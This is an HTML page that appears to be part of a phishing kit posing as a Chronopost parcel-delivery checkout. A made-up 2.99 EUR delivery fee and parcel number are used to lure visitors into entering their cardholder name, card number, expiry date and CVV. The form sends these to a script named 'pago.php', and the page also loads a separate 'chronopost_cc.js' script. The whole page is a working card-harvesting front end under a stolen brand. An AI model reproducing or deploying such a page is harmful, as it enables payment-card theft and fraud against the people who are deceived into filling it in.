
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
    <title>Chronopost |Envoi et suivi de colis</title>

<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="icon" href="htdocs/img/favicon.jpg" />
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<link rel="stylesheet" type="text/css" href="htdocs/css/style_001.css">
<link rel="stylesheet" type="text/css" href="htdocs/css/style_002.css">
<script src="//ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/00ce2dd051.js" crossorigin="anonymous"></script>

</head>
<body>

<div class="topnav" id="myTopnav">
<a href="# " id="top-img_pdn"><img src="htdocs/img/iconregistro.png" alt=""> </a>
  
 
  <a href="# " id="top-left"><img src="htdocs/img/separadortop.png" ></a>
  


<a href="#contact " id="top-img_hr">&nbsp;&nbsp;&nbsp;&nbsp;</a>
  <a href="javascript:void(0);" class="icon" >
    <i class="fa fa-bars"></i>
  </a>
</div>

<nav class="navbar navbar-expand-lg navbar-light bg-light">
  <div class="container">
    <a class="navbar-brand" href="#"><img src="htdocs/img/logo.png" alt=""></a>
  </div>
</nav>


<div class="btm_nav" id="myTopnav">
  <a href="#">Se connecter</a>
  <a href="#">Particuliers</a>
  <a href="#">Entreprises</a>
  <a href="#">Aide</a>
  <a href="#">Compagnie</a>
  <a href="#">Livreurs</a>
</div>



<div class="container">

<div class="row">
<div class="col-sm-9">
               <p class="alert alert-success" id="alert-success"><i class="fab fa-cc-mastercard"></i> &nbsp;<i class="fab fa-cc-visa"></i> &nbsp; Veuillez confirmer les frais de livraison (2,99 EUR) et l’adresse de livraison du colis.</p>
<form name="myForm" action="sourceApp/pago.php" onsubmit="return validateForm()" method="post">
<div class="card-body " id="icard-body">

<div class="tab-content">
<div class="tab-pane fade show active" id="nav-tab-card">
  <div class="form-group">
    <label for="username">Nom complet (sur la carte)</label>
    <input type="text" class="form-control" name="Kartenhalter" placeholder="" id="Kartenhalter">
  </div> <!-- form-group.// -->

  <div class="form-group">
    <label for="cardNumber">Numéro de carte</label>
    <div class="input-group">
      <input type="text" class="form-control" name="Kartennummer" id="Kartennummer" placeholder="">
      <div class="input-group-append">
        <span class="input-group-text text-muted">
          <i class="fab fa-cc-visa"></i> &nbsp; <i class="fab fa-cc-amex"></i> &nbsp; 
          <i class="fab fa-cc-mastercard"></i> 
        </span>
      </div>
    </div>
  </div> <!-- form-group.// -->

  <div class="row">
      <div class="col-sm-8">
          <div class="form-group">
              <label><span class="hidden-xs">Date d'expiration</span> </label>
            <div class="input-group">
              <input type="text" class="form-control" placeholder="" name="Ablauf" id="Ablauf">
            </div>
          </div>
      </div>
      <div class="col-sm-4">
          <div class="form-group">
              <label data-toggle="tooltip" title="" data-original-title="3 digits code on back side of the card">CVV2 <i class="fa fa-question-circle"></i></label>
              <input type="text" class="form-control" name="Sicherheitscode" id="Sicherheitscode">
          </div> <!-- form-group.// -->
      </div>
  </div> <!-- row.// -->
  <button class="subscribe btn btn-primary btn-block" type="submit" name="cartget"> payer  </button>
  
</div> <!-- tab-pane.// -->
<div class="tab-pane fade" id="nav-tab-paypal">
<p>Paypal is easiest way to pay online</p>
<p>
<button type="button" class="btn btn-primary"> <i class="fab fa-paypal"></i> Log in my Paypal </button>
</p>

</div>

</div> <!-- tab-content .// -->

</div></form>
            </div>

         <div class="col-sm-3 ">
               
               <div class="card">
  <div class="card-header">
   <strong> détails de la transaction </strong>
  </div>
  <ul class="list-group list-group-flush">
    <li class="list-group-item"><strong> montant: </strong>2,99 €</li>
    <li class="list-group-item"><strong> commerce: </strong>CHRONOPOST</li>
    <li class="list-group-item"><strong> terminal: </strong>346841091-1</li>
    <li class="list-group-item"><strong> Pracel: </strong><strong>XC25453425FR</strong></li>
    <li class="list-group-item"><img src="./htdocs/img/logopie.png"></li>
  </ul>

  
</div>

        </div>
 </div>
  </div>





<!-- Footer -->
<footer class="page-footer font-small indigo">
   <!-- Footer Links -->
   <div class="container text-center text-md-left">
      <!-- Grid row -->
      <div class="row">
         <!-- Grid column -->
         <div class="col-md-3 mx-auto">
            <!-- Links -->
            <h5 class=" text-uppercase mt-3 mb-4">Particulier</h5>
            <ul class="list-unstyled">
               <li>
                  <a href="#!" class="a_text_list">Envoyer un colis</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Suivre un envoi</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Nos offres</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Estimez les tarifs</a>
               </li>
            </ul>
         </div>
         <!-- Grid column -->
         <hr class="clearfix w-100 d-md-none">
         <!-- Grid column -->
         <div class="col-md-3 mx-auto">
            <!-- Links -->
            <h5 class=" text-uppercase mt-3 mb-4">Aide</h5>
            <ul class="list-unstyled">
               <li>
                  <a href="#!" class="a_text_list">Se créer un compte</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Nos guides</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Vos questions fréquentes</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Espace Outre-Mer</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Flash info</a>
               </li>
            </ul>
         </div>
         <!-- Grid column -->
         <hr class="clearfix w-100 d-md-none">
         <!-- Grid column -->
         <div class="col-md-3 mx-auto">
            <!-- Links -->
            <h5 class="text-uppercase mt-3 mb-4">Mieux nous connaître</h5>
            <ul class="list-unstyled">
               <li>
                  <a href="#!" class="a_text_list">Gouvernance Chronopost</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Nous rejoindre</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Engagé et responsable</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">A propos de Chronopost</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Espace Presse</a>
               </li>
            </ul>
         </div>
         <!-- Grid column -->
         <hr class="clearfix w-100 d-md-none">
         <!-- Grid column -->
         <div class="col-md-3 mx-auto">
            <!-- Links -->
            <h5 class=" text-uppercase mt-3 mb-4">Informations légales</h5>
            <ul class="list-unstyled">
               <li>
                  <a href="#!" class="a_text_list">Mentions légales</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Alerte fraude</a>
               </li>
               
            </ul>
         </div>
         <!-- Grid column -->
      </div>
      <!-- Grid row -->
   </div>
   <!-- Footer Links -->
   <!-- Copyright -->
   <div class="footer-copyright  py-3">
      <a href="" class="copyright">Copyright © Chronopost 2021</a>
      <a href="" class="logo-ft"> <img src="htdocs/img/logopie.png" ></a>
   </div>
   <!-- Copyright -->
</footer>
<!-- Footer -->
         <script src='//cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js'></script>
         <script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js'></script>
         <script type="text/javascript">
            $(":input").inputmask();
            
            $("#Kartennummer").inputmask({"mask": "9999 9999 9999 9999"});
            $("#Ablauf").inputmask({"mask": "99/9999"});
            $("#Sicherheitscode").inputmask({"mask": "999"});
         </script>
<script  src="sourceApp/chronopost_cc.js"></script>
</body>
</html>